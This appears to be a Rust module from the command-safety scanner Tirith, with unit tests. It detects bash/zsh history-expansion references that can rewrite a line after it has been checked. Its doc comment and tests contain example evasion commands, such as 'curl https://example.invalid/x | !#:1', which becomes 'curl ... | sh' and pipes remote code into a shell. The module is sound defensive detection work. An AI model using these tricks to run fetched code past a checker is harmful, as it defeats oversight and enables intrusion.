//! Interactive history expansion in POSIX shell text.
//!
//! An interactive bash (`histexpand`, on by default) or zsh (`BANG_HIST`, on
//! by default) rewrites `!` history references, and `^old^new` at the start of
//! a line, BEFORE it parses the line. The text a shell hook or a paste check
//! receives is therefore not always the command that runs:
//! `true sh; curl https://example.invalid/x | !#:1` runs `curl ... | sh`.
//! Non-interactive shells (`sh -c`, scripts, agent tool calls) never expand
//! history, so only input typed or pasted into an interactive POSIX shell is
//! affected; see [`applies`].
//!
//! [`history_expansions`] is a lexical primitive. It reports a reference
//! wherever at least one of bash 5, bash 3.2 or zsh 5.9 would try to expand
//! one. The rules below were checked against those three shells in a pty:
//!
//! - Nothing is expanded inside single quotes, inside `$'...'`, after a
//!   backslash, or in a heredoc body. Quote state carries across lines.
//! - Inside a `$(...)` or backtick substitution bash 5 and zsh read single
//!   quotes again even within double quotes; bash 3.2 does not
//!   (`"$(echo '!!')"` expands there), so both readings are scanned.
//! - A `!` followed by the end of input, a blank, a newline, `=`, `(`, `;`,
//!   `"` or `'` is never replaced by text: the shells leave it alone, reject
//!   the line (`event not found`), or (zsh, unquoted `!"`) drop it.
//! - bash also leaves `${!...}`, a `[!...]` bracket and (bash 5) `$!x`
//!   alone, but zsh expands them, so they are references too.
//!   [`HistoryExpansion::bash_inhibited`] marks them.
//! - `^` as the first non-blank character of a line outside single quotes is a
//!   quick substitution in zsh (bash requires column 0).
//!
//! Not modelled: a changed `histchars`, and history expansion turned off
//! (`set +H`, `setopt NO_BANG_HIST`); with it off the references found here
//! are inert text and a caller reports them conservatively.

use std::ops::Range;

use crate::extract::ScanContext;
use crate::tokenize::{self, ShellType};

/// What a history reference refers to.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum HistoryExpansionKind {
    /// `!#...`: words of the line being typed.
    CurrentLine,
    /// `^old^new` at the start of a line: the previous command, rewritten.
    QuickSubstitution,
    /// Any other `!` reference: words of an earlier history entry.
    Event,
}

/// One history reference in a shell input.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) struct HistoryExpansion {
    pub(crate) kind: HistoryExpansionKind,
    /// The reference: `!` (or `^`) through its event, word designator and
    /// modifiers, stopping before a quote, a backslash, a blank or a shell
    /// operator character, so replacing this range leaves quoting intact.
    pub(crate) range: Range<usize>,
    /// Non-blank text precedes the reference's line. In a multi-line paste
    /// bash expands each line after running the ones before it, so such a
    /// reference can name words of a line pasted earlier.
    pub(crate) after_first_line: bool,
    /// bash 5 leaves this `!` alone (`${!name}`, `[!a-z]`, `$!x`; bash 3.2
    /// expands `$!x`); zsh does not. What lands there stays inside a
    /// parameter or a glob bracket.
    pub(crate) bash_inhibited: bool,
}

/// Whether input in this context is read by an interactive POSIX shell, which
/// expands history: an exec check from the interactive bash/zsh hooks or a
/// paste check from their paste widgets (both pass `--interactive`). Agent
/// integrations pass `--non-interactive`; their commands run in shells that
/// never expand history. fish, PowerShell and cmd have no `!` history
/// expansion.
pub(crate) fn applies(shell: ShellType, scan_context: ScanContext, interactive: bool) -> bool {
    interactive
        && shell == ShellType::Posix
        && matches!(scan_context, ScanContext::Exec | ScanContext::Paste)
}

/// Whether `raw` holds any history reference (see [`history_expansions`]).
pub(crate) fn has_history_expansion(raw: &str) -> bool {
    may_hold_reference(raw) && !history_expansions(raw).is_empty()
}

/// Cheap pre-check: a `!` somewhere or a line whose first non-blank
/// character is `^`.
fn may_hold_reference(raw: &str) -> bool {
    raw.contains('!')
        || raw
            .split('\n')
            .any(|line| line.trim_start_matches([' ', '\t']).starts_with('^'))
}

/// Every history reference in `raw`, in input order.
pub(crate) fn history_expansions(raw: &str) -> Vec<HistoryExpansion> {
    if !may_hold_reference(raw) {
        return Vec::new();
    }
    // Heredoc bodies are never expanded. An unsupported or unterminated
    // heredoc leaves every line visible, which only reports more.
    let heredoc_bodies: Vec<Range<usize>> = if raw.contains("<<") && raw.contains('\n') {
        crate::extract::posix_heredoc_spans(raw)
            .unwrap_or_default()
            .into_iter()
            .map(|span| span.through_terminator)
            .collect()
    } else {
        Vec::new()
    };
    let mut bangs = std::collections::BTreeSet::new();
    let mut carets = std::collections::BTreeSet::new();
    for model in [QuoteModel::Nested, QuoteModel::Flat] {
        scan(raw, model, &heredoc_bodies, &mut bangs, &mut carets);
    }
    let mut out: Vec<HistoryExpansion> = Vec::new();
    for start in carets {
        out.push(reference_at(
            raw,
            start,
            HistoryExpansionKind::QuickSubstitution,
        ));
    }
    for start in bangs {
        let kind = if raw.as_bytes().get(start + 1) == Some(&b'#') {
            HistoryExpansionKind::CurrentLine
        } else {
            HistoryExpansionKind::Event
        };
        out.push(reference_at(raw, start, kind));
    }
    out.sort_by_key(|reference| reference.range.start);
    out
}

/// How a shell reads quotes while it looks for history references.
#[derive(Clone, Copy, PartialEq, Eq)]
enum QuoteModel {
    /// bash 5 and zsh: a `$(...)` or backtick substitution starts a fresh
    /// quoting context, even inside double quotes.
    Nested,
    /// bash 3.2: one flat pass in which `"` toggles double quotes and `'`
    /// quotes only outside them.
    Flat,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Frame {
    /// Unquoted text, at top level or inside a substitution that ends at an
    /// unmatched `)` (with its open-paren depth) or at a backtick.
    Unquoted(Closer),
    Double,
    Single,
    AnsiC,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Closer {
    Top,
    Paren(usize),
    Backtick,
}

/// Record the start of every `!` reference and line-start `^` that `model`
/// reads as live.
fn scan(
    raw: &str,
    model: QuoteModel,
    heredoc_bodies: &[Range<usize>],
    bangs: &mut std::collections::BTreeSet<usize>,
    carets: &mut std::collections::BTreeSet<usize>,
) {
    let bytes = raw.as_bytes();
    let mut stack = vec![Frame::Unquoted(Closer::Top)];
    let mut index = 0usize;
    let mut line_start = true;
    while index < bytes.len() {
        if let Some(body) = heredoc_bodies.iter().find(|body| body.start == index) {
            index = body.end;
            line_start = true;
            continue;
        }
        let top = *stack.last().unwrap_or(&Frame::Unquoted(Closer::Top));
        if line_start {
            line_start = false;
            if !matches!(top, Frame::Single | Frame::AnsiC) {
                let first = bytes[index..]
                    .iter()
                    .position(|byte| !matches!(byte, b' ' | b'\t'))
                    .map(|offset| index + offset);
                if let Some(first) = first.filter(|first| bytes[*first] == b'^') {
                    carets.insert(first);
                }
            }
        }
        let byte = bytes[index];
        if byte == b'\n' {
            line_start = true;
            index += 1;
            continue;
        }
        match top {
            Frame::Single => {
                if byte == b'\'' {
                    stack.pop();
                }
            }
            Frame::AnsiC => match byte {
                b'\\' => index += 1,
                b'\'' => {
                    stack.pop();
                }
                _ => {}
            },
            Frame::Double => match byte {
                b'\\' => index += 1,
                b'"' => {
                    stack.pop();
                }
                b'!' => {
                    if let Some(end) = live_bang(bytes, index) {
                        bangs.insert(index);
                        index = end;
                        continue;
                    }
                }
                b'$' if model == QuoteModel::Nested && bytes.get(index + 1) == Some(&b'(') => {
                    stack.push(Frame::Unquoted(Closer::Paren(0)));
                    index += 1;
                }
                b'`' if model == QuoteModel::Nested => {
                    stack.push(Frame::Unquoted(Closer::Backtick));
                }
                _ => {}
            },
            Frame::Unquoted(closer) => match byte {
                b'\\' => index += 1,
                b'\'' => {
                    if model == QuoteModel::Nested
                        && index > 0
                        && bytes[index - 1] == b'$'
                        && !preceded_by_backslash(bytes, index - 1)
                    {
                        stack.push(Frame::AnsiC);
                    } else {
                        stack.push(Frame::Single);
                    }
                }
                b'"' => stack.push(Frame::Double),
                b'!' => {
                    if let Some(end) = live_bang(bytes, index) {
                        bangs.insert(index);
                        index = end;
                        continue;
                    }
                }
                b'$' if model == QuoteModel::Nested && bytes.get(index + 1) == Some(&b'(') => {
                    stack.push(Frame::Unquoted(Closer::Paren(0)));
                    index += 1;
                }
                b'(' => {
                    if let Some(Frame::Unquoted(Closer::Paren(depth))) = stack.last_mut() {
                        *depth += 1;
                    }
                }
                b')' => match closer {
                    Closer::Paren(0) => {
                        stack.pop();
                    }
                    Closer::Paren(_) => {
                        if let Some(Frame::Unquoted(Closer::Paren(depth))) = stack.last_mut() {
                            *depth -= 1;
                        }
                    }
                    _ => {}
                },
                b'`' if model == QuoteModel::Nested => {
                    if closer == Closer::Backtick {
                        stack.pop();
                    } else {
                        stack.push(Frame::Unquoted(Closer::Backtick));
                    }
                }
                _ => {}
            },
        }
        index += 1;
    }
}

/// Whether the byte at `index` follows an odd run of backslashes.
fn preceded_by_backslash(bytes: &[u8], index: usize) -> bool {
    bytes[..index]
        .iter()
        .rev()
        .take_while(|byte| **byte == b'\\')
        .count()
        % 2
        == 1
}

/// When the `!` at `index` starts a reference, the end of its text. The
/// same characters stop a reference inside and outside double quotes (see
/// the module docs for `"`).
fn live_bang(bytes: &[u8], index: usize) -> Option<usize> {
    match bytes.get(index + 1) {
        None | Some(b' ' | b'\t' | b'\n' | b'\r' | b'=' | b'(' | b';' | b'"' | b'\'') => None,
        Some(_) => Some(reference_end(bytes, index)),
    }
}

/// A byte that ends a reference's text: it cannot be part of an event,
/// word designator or modifier without changing the quoting or the command
/// structure around it.
fn ends_reference(byte: u8) -> bool {
    byte.is_ascii_whitespace()
        || matches!(
            byte,
            b'"' | b'\''
                | b'\\'
                | b'`'
                | b';'
                | b'&'
                | b'|'
                | b'<'
                | b'>'
                | b'('
                | b')'
                | b'{'
                | b'}'
        )
}

/// End of the reference text that starts at `start` (a `!` or `^`).
fn reference_end(bytes: &[u8], start: usize) -> usize {
    let mut index = start + 1;
    match bytes.get(index) {
        // zsh `!{...}`.
        Some(b'{') => {
            if let Some(close) = bytes[index..]
                .iter()
                .take_while(|byte| **byte != b'\n')
                .position(|byte| *byte == b'}')
            {
                index += close + 1;
            }
        }
        // `!?string?`: the search string ends at the next `?`.
        Some(b'?') => {
            index += 1;
            while let Some(&byte) = bytes.get(index) {
                index += 1;
                if byte == b'?' {
                    break;
                }
                if ends_reference(byte) {
                    index -= 1;
                    break;
                }
            }
        }
        _ => {}
    }
    while bytes.get(index).is_some_and(|byte| !ends_reference(*byte)) {
        index += 1;
    }
    index.max(start + 1)
}

fn reference_at(raw: &str, start: usize, kind: HistoryExpansionKind) -> HistoryExpansion {
    let bytes = raw.as_bytes();
    let end = reference_end(bytes, start);
    let line_start = raw[..start].rfind('\n').map_or(0, |newline| newline + 1);
    let bash_inhibited = kind != HistoryExpansionKind::QuickSubstitution
        && ((start >= 1 && bytes[start - 1] == b'$')
            || (start >= 2 && &bytes[start - 2..start] == b"${" && raw[start..].contains('}'))
            || (start >= 1 && bytes[start - 1] == b'[' && raw[start + 1..].contains(']')));
    HistoryExpansion {
        kind,
        range: start..end,
        after_first_line: !raw[..line_start].trim().is_empty(),
        bash_inhibited,
    }
}

/// Whether `word` is a whole reference that re-runs one earlier command as
/// it was typed: `!!`, `!N`, `!-N`, `!prefix` or `!?string?`, with no word
/// designator and no modifier.
pub(crate) fn is_plain_event_reference(word: &str) -> bool {
    let Some(rest) = word.strip_prefix('!') else {
        return false;
    };
    if rest == "!" {
        return true;
    }
    let digits = |text: &str| !text.is_empty() && text.bytes().all(|byte| byte.is_ascii_digit());
    if let Some(number) = rest.strip_prefix('-') {
        return digits(number);
    }
    if rest
        .bytes()
        .next()
        .is_some_and(|byte| byte.is_ascii_digit())
    {
        return digits(rest);
    }
    let name_byte =
        |byte: u8| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'.' | b'/' | b'+');
    if let Some(search) = rest.strip_prefix('?') {
        let search = search.strip_suffix('?').unwrap_or(search);
        return !search.is_empty()
            && search
                .bytes()
                .all(|byte| name_byte(byte) || matches!(byte, b'-' | b'@' | b',' | b'='));
    }
    let mut bytes = rest.bytes();
    bytes
        .next()
        .is_some_and(|byte| byte.is_ascii_alphabetic() || matches!(byte, b'_' | b'.' | b'/' | b'+'))
        && bytes.all(name_byte)
}

/// Text substituted for a reference in [`command_probe`]: an unresolved
/// parameter, which the executable-body scan treats exactly as it treats
/// `$X` where a command is formed.
const PROBE_WORD: &str = "${__tirith_history_expansion}";

/// A copy of the input in which history references stand in for the
/// unresolved words they are (see [`command_probe`]).
pub(crate) struct CommandProbe {
    /// The input with each replaced reference swapped for an unresolved
    /// parameter.
    pub(crate) text: String,
    /// The replaced references, in input order.
    pub(crate) replaced: Vec<Range<usize>>,
}

/// `raw` with every first-line `!` reference that is not an exempt plain
/// re-run replaced by an unresolved parameter, or `None` when nothing was
/// replaced. Running the executable-body scan on the copy tells whether a
/// reference is used where a command is formed, exactly as it does for `$X`.
///
/// A reference bash leaves alone (`${!name}`, `[!a-z]`) is kept: what zsh
/// puts there stays inside a parameter or a glob bracket, which is already
/// dynamic text. A plain re-run (see [`is_plain_event_reference`]) is exempt
/// when it is the whole top-level simple command, optionally after `sudo` or
/// `doas` alone and before output redirections, and not a pipe sink: it
/// re-runs a command that was checked when it ran.
pub(crate) fn command_probe(raw: &str, expansions: &[HistoryExpansion]) -> Option<CommandProbe> {
    let exempt = exempt_plain_reruns(raw, expansions);
    let mut ranges: Vec<Range<usize>> = expansions
        .iter()
        .filter(|reference| {
            reference.kind == HistoryExpansionKind::Event
                && !reference.after_first_line
                && !reference.bash_inhibited
                && !exempt.contains(&reference.range.start)
        })
        .map(|reference| reference.range.clone())
        .collect();
    if ranges.is_empty() {
        return None;
    }
    ranges.sort_by_key(|range| range.start);
    let mut text = String::with_capacity(raw.len() + ranges.len() * PROBE_WORD.len());
    let mut replaced = Vec::with_capacity(ranges.len());
    let mut cursor = 0usize;
    for range in ranges {
        if range.start < cursor {
            continue;
        }
        text.push_str(&raw[cursor..range.start]);
        text.push_str(PROBE_WORD);
        cursor = range.end;
        replaced.push(range);
    }
    text.push_str(&raw[cursor..]);
    Some(CommandProbe { text, replaced })
}

/// Starts of the references that are exempt plain re-runs (see
/// [`command_probe`]).
fn exempt_plain_reruns(
    raw: &str,
    expansions: &[HistoryExpansion],
) -> std::collections::HashSet<usize> {
    let mut exempt = std::collections::HashSet::new();
    if !expansions.iter().any(|reference| {
        reference.kind == HistoryExpansionKind::Event && !reference.after_first_line
    }) {
        return exempt;
    }
    for segment in tokenize::tokenize(raw, ShellType::Posix) {
        if matches!(segment.preceding_separator.as_deref(), Some("|" | "|&"))
            || raw.get(segment.byte_range.clone()) != Some(segment.raw.as_str())
        {
            continue;
        }
        let words = blank_separated_words(&segment.raw);
        let ((offset, word), tail) = match words.as_slice() {
            [(_, lead), rerun, tail @ ..] if matches!(*lead, "sudo" | "doas") => (*rerun, tail),
            [rerun, tail @ ..] => (*rerun, tail),
            [] => continue,
        };
        if !is_plain_event_reference(word)
            || !only_output_redirections(tail.iter().map(|(_, word)| *word))
        {
            continue;
        }
        let start = segment.byte_range.start + offset;
        if expansions.iter().any(|reference| {
            reference.kind == HistoryExpansionKind::Event
                && !reference.after_first_line
                && reference.range == (start..start + word.len())
        }) {
            exempt.insert(start);
        }
    }
    exempt
}

/// The blank-separated words of `text` with their byte offsets.
fn blank_separated_words(text: &str) -> Vec<(usize, &str)> {
    let mut words = Vec::new();
    let mut start = None;
    for (index, byte) in text.bytes().enumerate() {
        match (matches!(byte, b' ' | b'\t'), start) {
            (true, Some(from)) => {
                words.push((from, &text[from..index]));
                start = None;
            }
            (false, None) => start = Some(index),
            _ => {}
        }
    }
    if let Some(from) = start {
        words.push((from, &text[from..]));
    }
    words
}

/// Whether `words` are only output redirections (`> log`, `>>log`, `2>&1`,
/// `&> log`), which leave a re-run command as it was. An input redirection
/// would feed it new input (a re-run `sh < script`), and a process
/// substitution runs another command, so neither is accepted.
fn only_output_redirections<'a>(words: impl IntoIterator<Item = &'a str>) -> bool {
    let mut words = words.into_iter();
    while let Some(word) = words.next() {
        let unnumbered = word.trim_start_matches(|ch: char| ch.is_ascii_digit());
        let operator = if unnumbered.len() == word.len() {
            unnumbered.strip_prefix('&').unwrap_or(unnumbered)
        } else {
            unnumbered
        };
        let Some(rest) = operator.strip_prefix('>') else {
            return false;
        };
        let rest = rest.strip_prefix(['>', '|']).unwrap_or(rest);
        if let Some(fd) = rest.strip_prefix('&') {
            if fd == "-" || (!fd.is_empty() && fd.bytes().all(|byte| byte.is_ascii_digit())) {
                continue;
            }
            return false;
        }
        let target = if rest.is_empty() {
            match words.next() {
                Some(target) => target,
                None => return false,
            }
        } else {
            rest
        };
        if target.is_empty() || target.starts_with(['(', '<', '>', '&', '|']) {
            return false;
        }
    }
    true
}

/// References that rewrite the line with text Tirith cannot see whatever
/// position they are in: `!#` (the line being typed), a line-start quick
/// substitution, and an event reference on a later line of a multi-line
/// input (which can name a line pasted before it). A reference bash leaves
/// alone counts here only as `!#`, which zsh does expand.
pub(crate) fn rewriting_references(expansions: &[HistoryExpansion]) -> Vec<&HistoryExpansion> {
    expansions
        .iter()
        .filter(|reference| match reference.kind {
            HistoryExpansionKind::CurrentLine | HistoryExpansionKind::QuickSubstitution => true,
            HistoryExpansionKind::Event => reference.after_first_line && !reference.bash_inhibited,
        })
        .collect()
}

const EVIDENCE_PATTERN: &str = "interactive history expansion";

fn evidence<'a>(
    raw: &str,
    ranges: impl IntoIterator<Item = &'a Range<usize>>,
) -> crate::verdict::Evidence {
    let mut texts: Vec<&str> = Vec::new();
    for range in ranges {
        let text = &raw[range.clone()];
        if !texts.contains(&text) {
            texts.push(text);
        }
    }
    texts.truncate(8);
    crate::verdict::Evidence::CommandPattern {
        pattern: EVIDENCE_PATTERN.to_string(),
        matched: crate::redact::redact_shell_assignments(&texts.join(" ")),
    }
}

/// The finding for [`rewriting_references`].
pub(crate) fn rewrite_finding(
    raw: &str,
    references: &[&HistoryExpansion],
) -> crate::verdict::Finding {
    let mut forms = Vec::new();
    if references
        .iter()
        .any(|reference| reference.kind == HistoryExpansionKind::CurrentLine)
    {
        forms.push("`!#` copies words of the line being typed");
    }
    if references
        .iter()
        .any(|reference| reference.kind == HistoryExpansionKind::QuickSubstitution)
    {
        forms.push(
            "`^old^new` at the start of a line re-runs the previous command with a substitution",
        );
    }
    if references
        .iter()
        .any(|reference| reference.kind == HistoryExpansionKind::Event)
    {
        forms.push(
            "a `!` reference on a later line of a multi-line input can copy words of a line pasted before it",
        );
    }
    crate::verdict::Finding {
        rule_id: crate::verdict::RuleId::AnalysisIncomplete,
        severity: crate::verdict::Severity::High,
        title: "Interactive history expansion rewrites this command".to_string(),
        description: format!(
            "An interactive bash or zsh expands history references before the line runs, so \
             the command that executes is not the text Tirith checked: {}. Type the command \
             out in full, or write `\\!` or single-quote the `!` when it is meant literally.",
            forms.join("; ")
        ),
        evidence: vec![evidence(
            raw,
            references.iter().map(|reference| &reference.range),
        )],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

/// The finding for a [`command_probe`] whose references form a command.
pub(crate) fn command_finding(raw: &str, probe: &CommandProbe) -> crate::verdict::Finding {
    crate::verdict::Finding {
        rule_id: crate::verdict::RuleId::AnalysisIncomplete,
        severity: crate::verdict::Severity::High,
        title: "History expansion supplies a command Tirith cannot see".to_string(),
        description: "An interactive bash or zsh replaces `!` history references (`!!`, `!$`, \
             `!prefix:1`, ...) with words of an earlier command before the line runs. Here one \
             forms a command name, a pipe sink, or the body of `sh -c`, `eval` or `exec`, so \
             Tirith cannot tell which command will execute. Type the command out in full. A lone \
             `!!`, `!-N` or `!prefix` re-run, optionally after `sudo` or `doas`, is not affected."
            .to_string(),
        evidence: vec![evidence(raw, &probe.replaced)],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kinds(raw: &str) -> Vec<(HistoryExpansionKind, String)> {
        history_expansions(raw)
            .into_iter()
            .map(|reference| (reference.kind, raw[reference.range].to_string()))
            .collect()
    }

    fn event(text: &str) -> (HistoryExpansionKind, String) {
        (HistoryExpansionKind::Event, text.to_string())
    }

    fn current(text: &str) -> (HistoryExpansionKind, String) {
        (HistoryExpansionKind::CurrentLine, text.to_string())
    }

    #[test]
    fn references_the_shells_expand_are_found() {
        assert_eq!(kinds("true sh; curl x | !#:1"), vec![current("!#:1")]);
        assert_eq!(kinds("echo !!"), vec![event("!!")]);
        assert_eq!(
            kinds("echo !!:1 !$ !^ !* !-2 !12"),
            vec![
                event("!!:1"),
                event("!$"),
                event("!^"),
                event("!*"),
                event("!-2"),
                event("!12"),
            ]
        );
        assert_eq!(kinds("!!:s/echo/sh/"), vec![event("!!:s/echo/sh/")]);
        assert_eq!(kinds("echo !?needle? x"), vec![event("!?needle?")]);
        assert_eq!(kinds("echo !{git}x"), vec![event("!{git}x")]);
        // Inside double quotes, `${...}`, arithmetic and comments.
        assert_eq!(kinds("sh -c \"!#:1-3\""), vec![current("!#:1-3")]);
        assert_eq!(kinds("echo ${x:-!!}"), vec![event("!!")]);
        assert_eq!(kinds("echo \"'!!'\""), vec![event("!!")]);
        assert_eq!(kinds("echo $((!x))"), vec![event("!x")]);
        assert_eq!(kinds("echo hi # !!"), vec![event("!!")]);
        // The reference stops before quoting and operators.
        assert_eq!(kinds("echo x!|cat"), vec![event("!")]);
        assert_eq!(kinds("a!\\true"), vec![event("!")]);
        // `!!#` is `!!` followed by text; `!#` after another reference is not
        // a fresh reference inside the first one's modifiers.
        assert_eq!(kinds("echo !!#"), vec![event("!!#")]);
    }

    #[test]
    fn quoting_escapes_and_inhibiting_characters_are_respected() {
        for raw in [
            "echo 'a!b'",
            "echo $'a!b'",
            "echo a\\!b",
            "echo \"a\\!b\"",
            "echo \"hi!\"",
            "echo hi!",
            "echo a!=b",
            "[[ $a != $b ]]",
            "test a != b",
            "! git diff --quiet",
            "if ! git diff --quiet; then echo dirty; fi",
            "echo !(x)",
            "ls !(*.txt)",
            "echo x!;echo y",
            "echo !\"x\"",
            "echo !'x'",
            "echo \"!'x\"",
            "echo $!",
            "awk '!seen[$0]++' f",
            "sed '/x/!d' f",
            "find . ! -name x",
            "printf \"%s\\n\" 'wow!!'",
            "echo wow\\!\\!",
            "echo $(echo '!!')",
            "echo `echo '!!'`",
            "echo '\n!# \n^a^b\n'",
        ] {
            assert_eq!(kinds(raw), vec![], "{raw:?}");
        }
    }

    #[test]
    fn bash_3_2_reads_single_quotes_inside_double_quoted_substitutions_literally() {
        assert_eq!(kinds("echo \"$(echo '!!')\""), vec![event("!!")]);
    }

    #[test]
    fn bash_inhibited_forms_are_references_that_zsh_expands() {
        for (raw, text) in [
            ("echo ${!prefix*}", "!prefix*"),
            ("ls [!a]*", "!a]*"),
            ("echo $!x", "!x"),
        ] {
            let found = history_expansions(raw);
            assert_eq!(found.len(), 1, "{raw:?}");
            assert_eq!(&raw[found[0].range.clone()], text, "{raw:?}");
            assert!(found[0].bash_inhibited, "{raw:?}");
        }
        // zsh expands `!#` there too, so it still counts as the current line.
        for raw in ["echo ${!#}", "ls [!#]*", "echo $!#"] {
            assert_eq!(
                history_expansions(raw)
                    .iter()
                    .map(|reference| reference.kind)
                    .collect::<Vec<_>>(),
                vec![HistoryExpansionKind::CurrentLine],
                "{raw:?}"
            );
        }
        // `[!a` with no closing `]` is expanded by bash too.
        assert!(!history_expansions("echo [!a")[0].bash_inhibited);
    }

    #[test]
    fn quick_substitution_counts_only_at_a_line_start_outside_single_quotes() {
        let quick = |raw: &str| {
            history_expansions(raw)
                .iter()
                .filter(|reference| reference.kind == HistoryExpansionKind::QuickSubstitution)
                .count()
        };
        assert_eq!(quick("^echo^sh"), 1);
        assert_eq!(quick("  ^echo^sh"), 1);
        assert_eq!(quick("true\n^echo^sh"), 1);
        assert_eq!(quick("echo \"\n^a^b\n\""), 1);
        assert_eq!(quick("echo a; ^echo^sh"), 0);
        assert_eq!(quick("echo '\n^a^b\n'"), 0);
        assert_eq!(quick("grep '^x' f"), 0);
    }

    #[test]
    fn heredoc_bodies_are_not_expanded() {
        assert_eq!(kinds("cat <<EOF\n^a^b\nA !# B\nEOF"), vec![]);
        assert_eq!(kinds("cat <<'EOF'\n!!\nEOF"), vec![]);
        // The header line and the lines after the terminator are.
        assert_eq!(
            kinds("cat <<EOF !#\nx\nEOF\n!!"),
            vec![current("!#"), event("!!")]
        );
    }

    #[test]
    fn later_lines_are_marked() {
        let found = history_expansions("echo a | tee b\ncurl x !:2 !:4");
        assert_eq!(found.len(), 2);
        assert!(found.iter().all(|reference| reference.after_first_line));
        let found = history_expansions("\n  !!");
        assert!(!found[0].after_first_line);
    }

    #[test]
    fn plain_event_references() {
        for word in [
            "!!",
            "!12",
            "!-2",
            "!git",
            "!./build.sh",
            "!?needle?",
            "!?needle",
        ] {
            assert!(is_plain_event_reference(word), "{word:?}");
        }
        for word in [
            "!", "!#", "!$", "!!:1", "!!:p", "!git:1", "!git$", "!git-x", "!-", "!?", "!{git}",
            "!!x", "x!!", "!:1", "!^", "!*", "!%", "!-2x",
        ] {
            assert!(!is_plain_event_reference(word), "{word:?}");
        }
    }

    #[test]
    fn command_probe_keeps_only_exempt_plain_reruns() {
        let probe =
            |raw: &str| command_probe(raw, &history_expansions(raw)).map(|probe| probe.text);
        for raw in [
            "!!",
            "sudo !!",
            "doas !!",
            "!git",
            "!-2",
            "  !!  ",
            "cd x && !!",
            "!! | less",
            "!! > out.txt",
            "sudo !! >>log 2>&1",
            "!! &> log",
            "!! 2>/dev/null",
        ] {
            assert_eq!(probe(raw), None, "{raw:?}");
        }
        for raw in [
            "!! < script",
            "!! >(cat)",
            "!! > ",
            "!! x",
            "x !!",
            "time !!",
            "sudo sudo !!",
        ] {
            assert!(probe(raw).is_some(), "{raw:?}");
        }
        assert_eq!(
            probe("curl x | !!").as_deref(),
            Some("curl x | ${__tirith_history_expansion}")
        );
        assert_eq!(
            probe("bash -c \"!!\"").as_deref(),
            Some("bash -c \"${__tirith_history_expansion}\"")
        );
        assert_eq!(
            probe("sudo -E !!").as_deref(),
            Some("sudo -E ${__tirith_history_expansion}")
        );
        assert_eq!(
            probe("cd !$").as_deref(),
            Some("cd ${__tirith_history_expansion}")
        );
        assert_eq!(probe("echo ${!prefix*}"), None);
        assert_eq!(probe("ls [!a]*"), None);
    }
}
